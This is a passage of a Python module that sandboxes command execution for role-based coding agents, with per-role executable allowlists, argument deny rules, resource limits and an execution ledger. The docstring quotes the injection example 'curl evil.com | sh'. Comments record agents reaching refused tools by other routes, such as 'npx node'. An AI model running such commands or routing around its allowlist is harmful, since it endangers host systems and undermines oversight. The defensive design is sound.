"""Contained command execution for role agents.

Why this module is shaped the way it is
---------------------------------------
The previous implementation validated a command *string* against anchored-prefix
regexes and then handed the whole string to ``sh -c``. That cannot work: a
pattern like ``^npm\\s+.*`` matches ``npm -v; curl evil.com | sh``, and the
shell then runs both halves. Any prefix-based check on a string destined for a
shell is decoration, not a control.

So this module changes the shape of the problem rather than tightening the
pattern list:

1. **Commands are argv lists, never strings.** There is no shell, so shell
   metacharacters have no meaning and there is nothing to escape.
2. **The executable is matched exactly**, against a per-role set. Arguments are
   screened separately for the handful of forms that turn an allowed executable
   back into an arbitrary one (``python -c``, ``npm exec``, and friends).
3. **Execution is contained** - no network by default, bounded memory, CPU and
   process count, dropped capabilities, read-only root filesystem, non-root
   user - so a command that does get through has very little to work with.
4. **It fails closed.** If the container runtime is missing, this raises instead
   of falling back to host execution.
"""

from __future__ import annotations

import json
import logging
import os
import re
import shutil
import subprocess
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterable, Sequence

logger = logging.getLogger(__name__)


class SandboxUnavailable(RuntimeError):
    """The container runtime needed to isolate execution is not usable."""


class CommandNotAllowed(ValueError):
    """The requested command is not permitted for this role."""


# Executables each role may invoke, matched exactly against argv[0].
ROLE_EXECUTABLES: dict[str, frozenset[str]] = {
    # `make` is added across build-capable roles: a Makefile is the entry point
    # for a large share of real projects, and without it those cannot be built
    # at all. It executes only what the repository's own Makefile contains,
    # which the agent wrote through the gated write tool.
    # Keyed by the name the sandbox is actually called with -
    # `f"{role}_specialist"` for each `SpecialistRole`. This read
    # `ui_specialist` while the role is `ui_ux`, so the key matched nothing and
    # the frontend specialist silently ran with the common set alone: on
    # run-0b55ad49 it was refused `node` eight times while building a web page.
    # `test_every_specialist_role_has_an_allowlist` now pins the correspondence.
    "ui_ux_specialist": frozenset({
        "npm", "npx", "node", "yarn", "pnpm", "make", "python3", "jest", "vitest", "tsc",
    }),
    # `node` belongs here for the same reason `npx` already did: a JavaScript
    # backend's entry point is `node server.js`, and without it the role that
    # wrote the file cannot run it. On run-95ca3f72 the backend specialist was
    # refused `node -e "require('./todo-app/script.js').initTodoApp()"` - a
    # smoke test of code it had just written - while `npx` (which can run any
    # package at all) was permitted.
    "backend_specialist": frozenset({
        "python", "python3", "pip", "pip3", "pytest", "cargo", "go", "uv", "make",
        "npm", "npx", "node", "yarn", "pnpm",
    }),
    # A migration is a script, and the role that writes one has to run it.
    "database_specialist": frozenset({"prisma", "psql", "alembic", "python", "python3", "make"}),
    # Test runners as well as package managers. The role whose entire job is
    # running tests could run `pytest` and no JavaScript runner at all - on a
    # brief that is explicitly HTML/CSS/JavaScript. Worse, the refusal bought
    # nothing: `npx` was already permitted, so `npx jest` ran jest anyway. What
    # it did buy, on run-95ca3f72, was the agent reasoning "We cannot run jest
    # because not allowed... we can set package.json test script and run npm
    # test" - writing a manifest at the workspace root, which is the collision
    # that cost the previous run three remediation rounds.
    #
    # These are test runners, not shells. `_FORBIDDEN_ARGS` still blocks the
    # argument forms that turn an interpreter back into a general one.
    "testing_specialist": frozenset({
        "pytest", "python", "python3", "npm", "npx", "yarn", "pnpm", "go", "cargo", "make",
        "jest", "mocha", "vitest", "jasmine", "karma", "tsc",
        # The role whose job is running tests must be able to run a test script.
        # Measured on run-3da8dd91: the testing specialist wrote a plain
        # `test-harness.js`, found `node` missing, and reasoned that it had
        # `npx` available - running it as `npx node test-harness.js`. That works
        # by accident, and `npx` can execute any package at all, so withholding
        # `node` bought no safety and cost a turn.
        "node",
    }),
    # Writes prose, and checks it against the code it documents.
    "documentation_specialist": frozenset({"python3", "node", "npx"}),
    # Audits what the other roles built: it has to be able to run the project
    # to test it. Refused `node` and `python3` on run-0b55ad49 while auditing a
    # JavaScript application.
    "security_reliability_specialist": frozenset({
        "python", "python3", "pip", "pip3", "pytest", "node", "npm", "npx", "make",
    }),
    "principal_architect": frozenset({"npx", "npm", "django-admin"}),
}

# Available to every role. Deliberately excludes `rm`, `mv` and `cp`: the write
# tool is the only sanctioned mutation path, and a destructive filesystem verb
# adds no capability an agent legitimately needs.
COMMON_EXECUTABLES = frozenset({
    "ls", "cat", "echo", "mkdir", "touch", "git", "pwd", "find", "head", "tail", "wc",
    # Read-only inspection. Neither can modify a file or execute anything, and
    # both are what an agent reaches for by reflex: `grep` was the single most
    # refused command on run-0b55ad49 (17 of 43 refusals), and every refusal
    # cost a model call to learn something the allowlist could have allowed.
    "grep", "which",
})

# Argument forms that would turn an allowed interpreter back into a general one.
_FORBIDDEN_ARGS: dict[str, frozenset[str]] = {
    "python": frozenset({"-c"}),
    "python3": frozenset({"-c"}),
    "node": frozenset({"-e", "--eval", "-p", "--print"}),
    "npm": frozenset({"exec"}),
    "npx": frozenset({"-c", "--call"}),
    "yarn": frozenset({"exec"}),
    "pnpm": frozenset({"exec"}),
    "git": frozenset({"-c", "--exec-path", "--upload-pack", "--receive-pack"}),
    # -f/--file would run a makefile from anywhere; --eval injects rules on the
    # command line. Both turn `make` into a general interpreter pointed at
    # something the workspace does not contain.
    "make": frozenset({"-f", "--file", "--makefile", "--eval", "-e"}),
}

_ALLOWED_PYTHON_MODULES = frozenset({"venv", "pip", "pytest", "unittest"})
"""Modules `python -m` may run.

`-m` was refused outright, which is too blunt: it is also the standard way to
do ordinary Python work, and blocking it left an agent unable to create a
virtualenv, install anything, or run a test suite. Refusing it did not even buy
much - `pip` and `pytest` are permitted as executables already, so `python -m pip`
grants nothing `pip` does not.

`-c` stays refused, because that genuinely is "here is a program, run it". So
is everything not named above - `http.server`, for one, would publish the
workspace on the network, which is an escape hatch rather than a build step.
"""


def _max_output_size() -> int:
    """Per-command output cap, in bytes.

    An iterative specialist accumulates one of these per command, and compaction
    keeps the most recent messages *untouched* - so this cap multiplied by the
    protected tail is a floor on context that compaction cannot reduce. Held
    independent of the window, that product is what killed a specialist stage:
    a 50 KB cap across a 20-message tail is ~123k tokens of untouchable context.

    Derived from the window instead, so the two cannot drift apart. The full
    output is still on disk and reachable via `read_command_output`; this bounds
    what enters the conversation, not what is kept.
    """
    from app.agents.context_budget import ContextBudget

    return ContextBudget.resolve().tool_output_bytes


MAX_OUTPUT_SIZE = _max_output_size()

TIMEOUTS = {"install": 300, "build": 180, "test": 300, "default": 120}

# Resource ceilings. A fork bomb or a runaway build hits these instead of the host.
MEMORY_LIMIT = os.environ.get("SANDBOX_MEMORY_LIMIT", "2g")
CPU_LIMIT = os.environ.get("SANDBOX_CPU_LIMIT", "2")
PIDS_LIMIT = os.environ.get("SANDBOX_PIDS_LIMIT", "512")

# Installing dependencies genuinely needs a registry, so network is granted per
# category rather than globally. Everything else runs with no network at all.
NETWORK_CATEGORIES = {"install"}

CONTAINER_MODE = "container"
IN_CONTAINER_MODE = "in-container"


def execution_mode() -> str:
    """Where a validated command actually runs.

    ``container`` (the default) starts a throwaway container per command, which
    needs a container runtime reachable from this process - in a Docker
    deployment that means mounting the daemon socket, and that socket is
    root-equivalent on the host.

    ``in-container`` runs the command directly in this container instead, as the
    unprivileged user, in the run's workspace. It is a deliberate trade: the
    command is contained by *this* container rather than by one of its own, so
    it can reach anything this process can, but nothing gains access to the
    host. For a single-tenant deployment that is the better end of the trade,
    because the alternative is handing the host's root out to whatever an
    uploaded document talks an agent into running.
    """
    configured = os.environ.get("SANDBOX_EXECUTION_MODE", CONTAINER_MODE).strip().lower()
    return IN_CONTAINER_MODE if configured in {IN_CONTAINER_MODE, "local", "direct"} else CONTAINER_MODE


# Ceilings applied to a directly-executed command. Without a container to
# enforce them, these are what stops a runaway build taking the worker with it.
_MEMORY_BYTES = {"k": 1024, "m": 1024**2, "g": 1024**3}


def _memory_limit_bytes() -> int:
    raw = MEMORY_LIMIT.strip().lower()
    multiplier = _MEMORY_BYTES.get(raw[-1:], 1)
    digits = raw[:-1] if multiplier > 1 else raw
    try:
        return int(float(digits) * multiplier)
    except ValueError:
        return 2 * 1024**3


MAX_WRITE_BYTES = int(os.environ.get("SANDBOX_MAX_FILE_BYTES", str(2 * 1024**3)))
"""Largest single file a command may write. A build that fills the shared
workspace volume takes every other run down with it."""


# Variables a command legitimately needs. Everything else in this process's
# environment is withheld, because the worker holds the database password, the
# JWT secret, the object-store credentials and every provider API key - and a
# command that runs `env` would otherwise print all of them straight into the
# model's context.
_ENV_PASSTHROUGH = (
    "PATH", "LANG", "LC_ALL", "TZ",
    "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
    "http_proxy", "https_proxy", "no_proxy",
)


def _usable_cpus() -> int:
    """How many CPUs this container may actually use, not how many exist.

    Kept as a name here because callers and tests use it; the reading lives in
    `app.tools.resources`, which the pre-flight check also uses, so there is one
    answer rather than two that can drift.
    """
    from app.tools.resources import usable_cpus

    return usable_cpus()


def _concurrency_environment() -> Dict[str, str]:
    """Environment that tells child tools the real concurrency and heap budget.

    Per-process rlimits multiply by the number of processes, so bounding one
    process is not bounding the command. The numbers come from
    `app.tools.resources`, which reads what is free now rather than only what
    the configuration allows: a container already holding a large conversation
    hands out a smaller heap than an idle one, which is the case that killed
    run-cbd22a34 twice.
    """
    from app.tools.resources import concurrency_environment

    return concurrency_environment(_memory_limit_bytes())


def _child_environment(workspace: str, extra_env: Dict[str, str] | None) -> Dict[str, str]:
    """A minimal environment for a directly-executed command."""
    environment = {
        key: os.environ[key] for key in _ENV_PASSTHROUGH if os.environ.get(key)
    }
    environment.setdefault("PATH", "/usr/local/bin:/usr/bin:/bin")
    # Tool caches (npm, pip, cargo) land in the workspace rather than in a
    # home directory shared by every run.
    home = os.path.join(workspace, ".agent-home")
    os.makedirs(home, exist_ok=True)
    environment["HOME"] = home
    environment["TMPDIR"] = home
    # Before `extra_env`, so a caller can still override a specific value.
    environment.update(_concurrency_environment())
    environment.update(extra_env or {})
    return environment


def _apply_limits() -> None:
    """Cap the child before it execs. Runs between fork and exec.

    Nothing here can be relied on the way a container's cgroup can - these are
    per-process rlimits, and a command that forks can multiply its memory use -
    but they turn the common runaway (one process allocating without bound, or
    writing an unbounded file) from an outage into a killed command.
    """
    import resource

    # Its own process group, so a timeout can kill the whole tree rather than
    # just the process this module started.
    os.setsid()

    # RLIMIT_DATA, not RLIMIT_AS. `RLIMIT_AS` caps *address space*, and a modern
    # runtime reserves far more of that than it ever uses: V8 and WebAssembly
    # reserve multi-gigabyte contiguous ranges up front as a bounds-check trick
    # and touch almost none of it. Against a 2 GB address-space cap every WASM
    # instantiation fails - on run-0b55ad49, `WebAssembly.Instance(): Out of
    # memory: Cannot allocate Wasm memory for new instance` appeared 24 times,
    # the milestone review concluded "no test commands succeeded in the
    # workspace", and agents had started writing `WebAssembly = null` stubs to
    # work around a limit that was never about their memory use.
    #
    # `RLIMIT_DATA` bounds the heap that a runaway actually grows (and since
    # Linux 4.7 covers mmap'd data too), which is the thing worth bounding. The
    # container path sets a real cgroup limit besides; this is the backstop for
    # local execution, where there is no cgroup.
    memory_limit = getattr(resource, "RLIMIT_DATA", resource.RLIMIT_AS)
    for limit, value in (
        (memory_limit, _memory_limit_bytes()),
        (resource.RLIMIT_FSIZE, MAX_WRITE_BYTES),
    ):
        try:
            soft, hard = resource.getrlimit(limit)
            ceiling = value if hard == resource.RLIM_INFINITY else min(value, hard)
            resource.setrlimit(limit, (ceiling, hard))
        except (ValueError, OSError):
            # A limit this platform will not accept is not worth failing over.
            continue


def _image_for(executable: str) -> str:
    if executable in {"npm", "npx", "node", "yarn", "pnpm"}:
        return os.environ.get("SANDBOX_NODE_IMAGE", "node:20-slim")
    if executable in {"python", "python3", "pip", "pip3", "pytest", "uv", "django-admin", "alembic"}:
        return os.environ.get("SANDBOX_PYTHON_IMAGE", "python:3.12-slim")
    if executable == "go":
        return os.environ.get("SANDBOX_GO_IMAGE", "golang:1.22")
    if executable == "cargo":
        return os.environ.get("SANDBOX_RUST_IMAGE", "rust:1-slim")
    return os.environ.get("SANDBOX_BASE_IMAGE", "debian:12-slim")


#: Package-manager subcommands that create or rewrite a project manifest.
_MANIFEST_WRITING_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "npm": frozenset({"init", "install", "i", "add", "create"}),
    "yarn": frozenset({"init", "add", "install"}),
    "pnpm": frozenset({"init", "add", "install"}),
    "npx": frozenset({"create-react-app", "create-next-app", "create-vite"}),
}

#: Flags that aim a package manager at a directory other than where it runs.
_PREFIX_FLAGS = ("--prefix", "--cwd", "--dir", "-C")


def manifest_written_outside_the_project(command: Sequence[str], repo_root: str) -> str | None:
    """Why this command would scaffold beside the project, or None if it would not.

    Commands always run with the workspace root as their working directory, so
    `npm install` there creates `package.json` and `node_modules` at the root -
    beside a project that already has its own. The two then disagree about
    dependency versions and test configuration, which on run-0b55ad49 meant jest
    30 at the root running the project's jest-29 tests and three remediation
    rounds spent on "Identifier 'jest' has already been declared".

    `write_artifact` already refuses a root manifest once a project is pinned,
    but a package manager reaches the same file through a different door.

    Only fires when a project is actually pinned, and passing `--prefix` (or
    equivalent) is taken as knowing where you are aiming.
    """
    if not command:
        return None
    from app.tools.repository import pinned_project_directory

    executable = Path(str(command[0])).name
    subcommands = _MANIFEST_WRITING_SUBCOMMANDS.get(executable)
    if not subcommands:
        return None
    arguments = [str(part) for part in command[1:]]
    if not any(argument in subcommands for argument in arguments):
        return None
    if any(argument.startswith(_PREFIX_FLAGS) for argument in arguments):
        return None

    try:
        pinned = pinned_project_directory(Path(repo_root))
    except Exception:  # noqa: BLE001 - a guard must not fail the command it guards
        return None
    if not pinned:
        return None

    return (
        f"'{' '.join([executable, *arguments[:2]])}' would create or rewrite a project "
        f"manifest at the workspace root, and this run's project is '{pinned}'. Two "
        "manifests disagree about dependency versions and test configuration, and the "
        f"tests then run under the wrong one. Use --prefix {pinned} (or run the "
        f"equivalent command against '{pinned}/') instead."
    )


class WorkingDirectoryRejected(Exception):
    """The requested working directory is not a directory inside the workspace."""


def resolve_working_directory(workspace: str, working_directory: str | None) -> str:
    """The absolute directory a command should run in, always inside `workspace`.

    There is no shell, so an agent cannot `cd`. Without this parameter the only
    way to act on a subdirectory was a tool that happens to take one - `npm`
    has `--prefix`, `npx` and a shell script have nothing - and every role that
    tried `cd todo-app && npx jest` was refused with no alternative to fall
    back on.

    Measured on run-95ca3f72: eight commands were spent discovering `--prefix`,
    and `./scripts/line_count_check.sh` inside the project was never runnable
    at all. Four of the refusals were `cd`, one was `bash -lc`; putting either
    on the allowlist would hand back the shell this sandbox exists to withhold.
    """
    root = Path(workspace).resolve()
    if not working_directory:
        return str(root)

    candidate = Path(working_directory)
    if candidate.is_absolute():
        # Two different things arrive here wearing the same leading slash.
        #
        # One is the workspace's own absolute path, which agents read out of
        # tool results. The other is `/project-name`, which is how every role
        # is taught to address the workspace root - the read tools, the write
        # tool and the prompt all use it - and which means the subdirectory,
        # not a path at the filesystem root.
        #
        # Only the first was accepted. On run-61c5a5b6 the UI specialist ran
        # its verifier with `working_directory="/simple-to-do-list-app"`, was
        # told the directory it was standing in was "outside the workspace",
        # and had to retry - a gate spent on a convention this codebase itself
        # taught it.
        try:
            resolved = candidate.resolve()
        except OSError as exc:
            raise WorkingDirectoryRejected(
                f"'{working_directory}' is not inside the workspace."
            ) from exc
        if resolved == root or root in resolved.parents:
            candidate = Path(os.path.relpath(resolved, root))
        else:
            candidate = Path(str(candidate).lstrip("/"))

    target = (root / candidate).resolve()
    if target != root and root not in target.parents:
        raise WorkingDirectoryRejected(
            f"'{working_directory}' is outside the workspace. Give a path relative to "
            "the workspace root, such as the project directory's name."
        )
    if not target.is_dir():
        raise WorkingDirectoryRejected(
            f"'{working_directory}' is not a directory in this workspace."
        )
    return str(target)


def workspace_rooted_arguments(
    argv: list[str], workspace: str, run_in: str
) -> list[str]:
    """Read `/project/file` in a command argument the way every other tool does.

    `ls`, `read_file`, `glob`, `write_artifact` and `working_directory` all take
    a leading slash to mean the workspace root, and the prompt teaches it. A
    command argument was the one place that did not: the command runs in a
    container where `/` is the container's own root, so `/todo-app/index.html`
    named nothing.

    Measured on run-61c5a5b6: the documentation specialist ran
    `wc -l /simple-to-do-list-app/index.html`, got "No such file", and spent six
    approval gates on `pwd`, `ls /`, `find` and two more `wc` spellings working
    out a convention it had been taught correctly everywhere else.

    Deliberately narrow. An argument is rewritten only when all three hold: it
    is absolute, nothing is at that path, and something *is* at the same path
    inside the workspace. So a regex, a URL, a compiler flag and a real absolute
    path are all left exactly as they are - there is no reading of them under
    which the rewrite would fire.

    The replacement is relative to the directory the command will run in, which
    is correct whether the workspace is mounted at `/workspace` in a sandbox
    container or used in place.
    """
    rewritten = list(argv)
    for index, argument in enumerate(rewritten[1:], start=1):
        if not argument.startswith("/") or argument == "/":
            continue
        if os.path.exists(argument):
            continue
        candidate = os.path.join(workspace, argument.lstrip("/"))
        # `commonpath` rather than `startswith`: the argument may contain `..`.
        try:
            resolved = os.path.realpath(candidate)
            if os.path.commonpath([resolved, workspace]) != workspace:
                continue
        except ValueError:  # different drives; cannot be inside
            continue
        # The path itself, or - for a path being created - its parent. A
        # `mkdir` target does not exist yet by definition, so requiring the
        # path itself to be there excluded exactly the case that needs this.
        # Measured on run-2b5def74: the testing specialist spent five gates on
        # `mkdir -p /simple-to-do-list-app/tests`, `mkdir -p /tests`, `ls`,
        # `pwd` and finally a relative path - and put the tests in the wrong
        # directory as a result.
        #
        # The parent still has to exist inside the workspace, so this stays
        # narrow: `/nothing-here/x` and a regex like `/foo/` have no parent
        # here and are left alone.
        if not os.path.exists(candidate) and not os.path.isdir(os.path.dirname(candidate)):
            continue
        rewritten[index] = os.path.relpath(candidate, run_in)
    return rewritten


def allowed_executables(role_name: str) -> frozenset[str]:
    """Executables this role may run.

    An unknown role gets only the common set. The previous code did the
    opposite - it *widened* the allowlist for unrecognised roles - so a typo in a
    role name granted more access, not less.
    """
    return ROLE_EXECUTABLES.get(role_name, frozenset()) | COMMON_EXECUTABLES


def validate_command(command: Sequence[str], role_name: str) -> list[str]:
    """Return the validated argv, or raise CommandNotAllowed."""
    if isinstance(command, str):
        raise CommandNotAllowed(
            "Commands must be given as a list of arguments, e.g. [\"npm\", \"install\"]. "
            "A single string would require a shell, which is not available."
        )
    argv = [str(part) for part in command]
    if not argv:
        raise CommandNotAllowed("Command cannot be empty.")

    executable = os.path.basename(argv[0])
    permitted = allowed_executables(role_name)
    if executable not in permitted:
        raise CommandNotAllowed(
            f"'{executable}' is not permitted for role '{role_name}'. "
            f"Allowed: {', '.join(sorted(permitted))}."
        )

    forbidden = _FORBIDDEN_ARGS.get(executable, frozenset())
    for index, arg in enumerate(argv[1:], start=1):
        if arg in forbidden:
            raise CommandNotAllowed(
                f"'{executable} {arg}' is not permitted: it can execute arbitrary code. "
                "Put the code in a file inside the project folder, run the file, then "
                "remove it with `delete_artifact`."
            )
        if arg == "-m" and executable in {"python", "python3"}:
            module = argv[index + 1] if index + 1 < len(argv) else ""
            if module not in _ALLOWED_PYTHON_MODULES:
                raise CommandNotAllowed(
                    f"'{executable} -m {module}' is not permitted: it can execute arbitrary code. "
                    f"Allowed modules: {', '.join(sorted(_ALLOWED_PYTHON_MODULES))}."
                )

    server = _starts_a_server(argv)
    if server:
        raise CommandNotAllowed(
            f"'{server}' is not permitted: it runs until it is stopped, and "
            "nothing here will stop it, so this call would sit until the "
            "timeout and return nothing. There is also no browser to open the "
            "page with. To check the page, read the files and assert on them "
            "from a test; to check the logic, import it and call it."
        )
    return argv


#: Commands whose whole purpose is to keep running. A static file server is
#: the one agents reach for: they want to "open the page", and there is no
#: browser here to open it with, so the server serves nobody until the timeout
#: kills it. Measured across the stored runs - every one of these is a 120s
#: wait that returned nothing:
#:
#:   run-cbd22a34  npx serve . -p 8000        specialist_testing_1
#:   run-cbd22a34  npx serve -p 8000          specialist_testing_1 (retried)
#:   run-cbb1a5fc  npx http-server -p 8765    specialist_ui_ux_0
#:   run-2eb3aa24  npx --yes serve -p 3000    specialist_ui_ux_0 (retried)
#:
#: Half of all command timeouts on record. A refusal costs nothing and says
#: what to do instead; a timeout costs two minutes and says nothing. This is
#: the shape of the `node -e` refusal above, which works.
_SERVER_COMMANDS = frozenset(
    {
        "serve",
        "http-server",
        "live-server",
        "browser-sync",
        "webpack-dev-server",
        "vite",
        "nodemon",
    }
)

#: `python3 -m http.server`, the same idea from the other language.
_SERVER_MODULES = frozenset({"http.server", "SimpleHTTPServer"})


def _starts_a_server(argv: Sequence[str]) -> str | None:
    """The name of the server this command would start, or None.

    Matched on the argument rather than the executable because these arrive as
    `npx serve` and `npx --yes serve`, never as `serve` alone.
    """
    parts = [os.path.basename(str(part)) for part in argv]
    for index, part in enumerate(parts):
        if part in _SERVER_MODULES:
            return part
        if part not in _SERVER_COMMANDS:
            continue
        # `vite build` and `webpack-dev-server --help` terminate; only the bare
        # invocation and an explicit `dev`/`start`/`serve` keep running.
        following = parts[index + 1 :]
        if any(f in {"build", "--help", "-h", "--version", "-v"} for f in following):
            return None
        return part
    return None


#: What to say when a command hits the wall. "Command timed out" alone tells an
#: agent nothing about why, and the commonest cause is not slowness: it is a
#: command that was never going to exit. `_SERVER_COMMANDS` refuses the ones
#: that can be recognised by name, but run-2eb3aa24's ui specialist wrote its
#: own - `node serve-test.mjs` - and no name check can catch that.
_TIMEOUT_ADVICE = (
    " A command that does not finish is usually one that was not meant to: a "
    "server, a watcher, or something waiting on input that will never come. "
    "Nothing here will connect to a server and there is no browser to open a "
    "page with, so it would have served nobody. To check a page, read the file "
    "and assert on its contents from a test; to check logic, import it and call "
    "it. If the command really is just slow, run the smaller part of it."
)


def strip_a_doubled_working_directory(
    command: Sequence[str], repo_root: str, working_directory: str | None
) -> tuple[list[str], str | None]:
    """Drop a project directory an argument repeats from `working_directory`.

    An agent that sets `working_directory` to the project and then writes the
    project into the path as well produces `todo-app/todo-app/app.test.mjs`,
    which exists nowhere. Seen in at least seven runs:

        run-2b5def74  simple-to-do-list-app/simple-to-do-list-app/app.test.js
        run-61c5a5b6  simple-to-do-list-app/simple-to-do-list-app/tests.test.js  (x6)
        run-cbb1a5fc  simple-to-do-list-app/simple-to-do-list-app/app.test.mjs
        run-da6c5e19  task-manager/task-manager/*.test.*
        run-2eb3aa24  simple-to-do-list-app/simple-to-do-list-app/app.test.mjs

    The ambiguity is real - nothing says whether a path argument resolves
    against the workspace root or against `working_directory` - so the agent
    guesses, and half the time it guesses the same prefix twice.

    Rewritten only when the path as given does NOT exist and the stripped one
    DOES. That is what makes this safe rather than clever: a project that
    genuinely contains a directory of its own name still resolves as written,
    because then the original exists and nothing is touched.
    """
    # A string, not a list, is refused downstream with a message that says so.
    # `list()` on it would split it into characters and the refusal would name
    # a one-letter executable instead - which is exactly what it did.
    if isinstance(command, (str, bytes)) or not working_directory:
        return command if isinstance(command, (str, bytes)) else list(command), None
    prefix = str(working_directory).strip("/")
    if not prefix:
        return list(command), None
    try:
        base = Path(repo_root).resolve() / prefix
    except Exception:  # noqa: BLE001 - a guard must not fail the command
        return list(command), None

    rewritten: list[str] = []
    changed: list[str] = []
    for part in command:
        argument = str(part)
        if argument.startswith(f"{prefix}/"):
            shortened = argument[len(prefix) + 1 :]
            try:
                if not (base / argument).exists() and (base / shortened).exists():
                    rewritten.append(shortened)
                    changed.append(f"{argument} -> {shortened}")
                    continue
            except OSError:
                pass
        rewritten.append(argument)
    if not changed:
        return list(command), None
    return rewritten, (
        "Note: the working directory is already '"
        + prefix
        + "', so "
        + ", ".join(changed)
        + " (the path as given does not exist; the shortened one does). Paths "
        "in a command are relative to the working directory."
    )


def _docker_binary() -> str:
    binary = shutil.which("docker") or shutil.which("podman")
    if not binary:
        raise SandboxUnavailable(
            "No container runtime found on PATH, so a command cannot be given its own "
            "container. Either make Docker or Podman reachable from this process, or set "
            "SANDBOX_EXECUTION_MODE=in-container to run commands in this container instead "
            "(weaker isolation of the command, but no access to the host), or set "
            "ALLOW_COMMAND_EXECUTION=false to disable execution tools explicitly."
        )
    return binary


def execution_enabled() -> bool:
    """Execution is opt-in. The previous default was 'true' - fail-open."""
    return os.environ.get("ALLOW_COMMAND_EXECUTION", "false").strip().lower() in {"1", "true", "yes", "on"}


def _as_workspace_relative(text: str, workspace: str) -> str:
    """Rewrite the host's workspace path out of command output.

    A command runs with the workspace mounted at its real path, so anything it
    prints - a traceback, a "file not found", a compiler error - quotes that
    path. The agent reads it and uses it, and every filesystem tool it holds
    then fails, because inside the agent the workspace is rooted at "/".

    Measured on run-0b55ad49: agents called `ls` against that exact string four
    times in a row across two stages, every attempt returning `path_not_found`,
    and passed it to `node` and `read_file` besides. Removing it from the
    prompts is only half the fix - command output puts it back.

    Rewritten to a *relative* path, not a rooted one. Command output is most
    often read back into another command, and commands already run with the
    workspace as their working directory - so `simple-todo-list-app/app.js`
    works there while `/simple-todo-list-app/app.js` does not. That second form
    is not hypothetical either: agents built shell commands from rooted paths
    three times in one stage on run-0b55ad49, and every one failed. The artifact
    tools accept a relative path too, so this form is the one that works
    everywhere the agent might paste it.
    """
    if not workspace or not text:
        return text
    root = str(workspace).rstrip("/")
    if not root:
        return text
    # The trailing-slash form first, so `<root>/docs` becomes `docs` rather than
    # a stray leading separator; the bare root becomes `.`, the workspace itself.
    return text.replace(f"{root}/", "").replace(root, ".")


def _truncate(text: str, label: str = "output") -> str:
    """Cap output for the model, keeping the whole of it on disk.

    The tail is kept as well as the head: a build's actual error is almost
    always in the last lines, and a head-only cut reliably discards it.
    """
    if len(text) <= MAX_OUTPUT_SIZE:
        return text

    from app.tools.journal import write_entry

    reference = write_entry(label, text)
    head = text[: int(MAX_OUTPUT_SIZE * 0.4)]
    tail = text[-int(MAX_OUTPUT_SIZE * 0.4):]
    pointer = (
        f"\n\n...[{len(text) - len(head) - len(tail)} bytes omitted"
        + (f"; full output saved as {reference}" if reference else "")
        + "]...\n\n"
    )
    return head + pointer + tail


def _ledger_path(repo_root: str) -> Path | None:
    """Where this run's execution ledger lives, or None if it cannot be placed.

    Keyed by the workspace directory name, which is per-run
    (`<product>-run-<uuid>`), so no run id has to be plumbed through the tool
    layer to reach here.

    Under DATA_DIR rather than in the workspace: the workspace is product
    output, listed as run artifacts and archived, and an execution log is
    neither.
    """
    try:
        name = Path(repo_root).resolve().name
        if not name:
            return None
        directory = Path(os.environ.get("DATA_DIR", ".")) / "ledger"
        directory.mkdir(parents=True, exist_ok=True)
        return directory / f"{re.sub(r'[^A-Za-z0-9_.-]+', '-', name)}.jsonl"
    except Exception:  # noqa: BLE001 - a missing ledger is not a failed command
        return None


def _as_exit_code(value: Any) -> int | None:
    """Normalise a returncode to an int.

    The executor renders it as a *string* on every path, which is fine for the
    model but makes `== 0` quietly false for anything comparing programmatically.
    """
    if value is None:
        return None
    try:
        return int(value)
    except (TypeError, ValueError):
        return None


def _record_execution(repo_root: str, role_name: str, command: Sequence[str], result: dict) -> None:
    """Append one command's outcome to the run's ledger. Never raises.

    Verification is otherwise self-reported: a specialist writes
    `tests: ["ran pytest, all green"]` and nothing establishes whether anything
    ran. The executor knows the truth - it has the argv and the exit code - and
    used to discard it the moment the tool result was consumed.

    Refusals are recorded too. A specialist that tried to run a test and was
    refused is materially different from one that never tried, and only this
    can tell them apart.
    """
    path = _ledger_path(repo_root)
    if path is None:
        return
    try:
        entry = {
            "at": datetime.now(timezone.utc).isoformat(),
            "role": role_name,
            "command": [str(part) for part in command],
            "returncode": _as_exit_code(result.get("returncode")),
            "error": result.get("error"),
        }
        with path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(entry) + "\n")
    except OSError:
        logger.debug("Could not append to the execution ledger", exc_info=True)


def read_execution_ledger(repo_root: str, limit: int = 200) -> list[dict]:
    """Every command this run actually ran, oldest first. Never raises."""
    path = _ledger_path(repo_root)
    if path is None or not path.is_file():
        return []
    entries: list[dict] = []
    try:
        for line in path.read_text(encoding="utf-8").splitlines()[-limit:]:
            try:
                entries.append(json.loads(line))
            except ValueError:
                continue
    except OSError:
        return []
    return entries


def summarise_executions(repo_root: str) -> str:
    """A short digest of what actually ran, for a reviewer or a model."""
    entries = read_execution_ledger(repo_root)
    if not entries:
        return "No commands were executed in this workspace."
    lines = []
    for entry in entries[-40:]:
        argv = " ".join(str(part) for part in entry.get("command") or [])
        code = entry.get("returncode")
        outcome = "OK" if code == 0 else (f"exit {code}" if code is not None else "refused")
        lines.append(f"- [{entry.get('role', '?')}] {argv} -> {outcome}")
    passed = sum(1 for e in entries if e.get("returncode") == 0)
    return f"{len(entries)} command(s) executed, {passed} succeeded:\n" + "\n".join(lines)


class SandboxExecutor:
    """Runs an argv list inside a locked-down throwaway container."""

    @staticmethod
    def _resolve_executable(name: str, workspace: str, run_in: str | None = None) -> str | None:
        """Find the binary to run, allowing ones the run installed for itself.

        A real build uses tools it installed: `.venv/bin/pytest`,
        `node_modules/.bin/vite`. Resolving only against PATH would make those
        unreachable and leave the agent unable to run the very things it just
        set up.

        A path is therefore accepted, but only after resolving it inside the
        workspace - otherwise `../../../usr/bin/whatever` would step straight
        past the allowlist, which matches on the basename.
        """
        if os.sep in name or (os.altsep and os.altsep in name):
            root = os.path.realpath(workspace)
            # A relative path is relative to where the command runs, which is
            # what `./scripts/check.sh` means to whoever typed it. The bound is
            # still the workspace root, checked below.
            base = os.path.realpath(run_in) if run_in else root
            # Normalised, not resolved: `..` is collapsed lexically so a path
            # out of the workspace is refused, while a symlink whose *target*
            # sits outside is still allowed. That distinction matters because
            # `python -m venv` builds exactly such a symlink - following it
            # would reject every virtualenv an agent creates for itself.
            #
            # Nothing is lost by permitting it. The role allowlist still matches
            # on the basename, and an agent already runs code it wrote itself
            # every time it does `python app.py`; the allowlist bounds which
            # interpreters exist, not whether the agent's own code runs.
            candidate = os.path.normpath(os.path.join(base, name))
            if candidate != root and not candidate.startswith(root + os.sep):
